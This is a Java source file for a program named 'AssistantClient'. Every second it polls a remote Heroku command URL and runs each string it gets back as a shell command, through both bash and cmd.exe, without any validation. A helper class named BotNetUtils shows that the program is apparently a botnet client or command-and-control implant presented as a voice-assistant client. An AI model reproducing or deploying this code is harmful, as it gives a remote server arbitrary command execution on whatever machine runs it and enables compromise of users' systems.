import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Scanner;

public class AssistantClient {
    private static final String PATH = "https://voice-assistant-server.herokuapp.com/commands/pool-first-commands";
    public static void main(String[] args) {
        System.out.println("Starting Assistant client");
        while (true) {
            String response = BotNetUtils.httpsGETRequest(PATH);
            if (!response.isEmpty()) {
                System.out.println("Starting running command : " + response);
                runCommand(response);
                excCommand(response);
                //runProject(response);
            }
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }
    }

    public static boolean runProject(String command){
        try {
//            Process compilingProcess = Runtime.getRuntime().exec(command);
//            while (compilingProcess.isAlive()){
//
//            }
            Process runInTest = Runtime.getRuntime().exec(command);
            while (runInTest.isAlive()){

            }
            try (BufferedReader input =
                         new BufferedReader(new
                                 InputStreamReader(runInTest.getInputStream()))) {
                String line;
                while ((line = input.readLine()) != null) {
                    System.out.println(line);
                }
            }

            return true;
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }

    public static void excCommand(String command){
        Runtime rt = Runtime.getRuntime();
        try {
            rt.exec(new String[]{"cmd.exe","/c",command});

        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }

    public static void runCommand(String command) {
        try {

            ProcessBuilder processBuilder = new ProcessBuilder();

            // Run a shell command
            processBuilder.command("bash", "-c", command);

            Process process = processBuilder.start();

            while (process.isAlive()) {

            }

            StringBuilder output = new StringBuilder();

            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));

            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line + "\n");
                System.out.println("waiting command : " + command);
            }

            int exitVal = process.waitFor();
            if (exitVal == 0) {
                System.out.println("Success!");
                System.out.println(output);
            } else {
                System.out.println("No response from command");
            }

        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
